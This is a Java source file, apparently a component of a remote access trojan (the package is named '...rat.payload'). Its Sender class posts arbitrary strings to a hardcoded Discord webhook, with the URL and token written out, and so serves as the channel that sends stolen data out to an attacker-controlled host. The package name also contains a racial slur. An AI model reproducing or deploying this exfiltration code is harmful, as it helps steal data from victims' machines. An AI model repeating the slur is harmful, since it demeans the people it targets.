package me.nigger.rat.payload;

public final class Sender
{
    private static final Sender INSTANCE = new Sender();
    private final Queue<Object> queue = new ArrayDeque<>();

    private Sender()
    {

    }

    public static void send(Object string)
    {
        Webhook webhook = new Webhook("https://discord.com/api/webhooks/1106363099868581950/sWJ5b_EWuzZV5GqtxEgCwt8CUFOqARpbWHNGBsC9QSyyPdELTf056nsg_YydbfsiJDbc");
        webhook.setContent((String) string);
        try {
            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
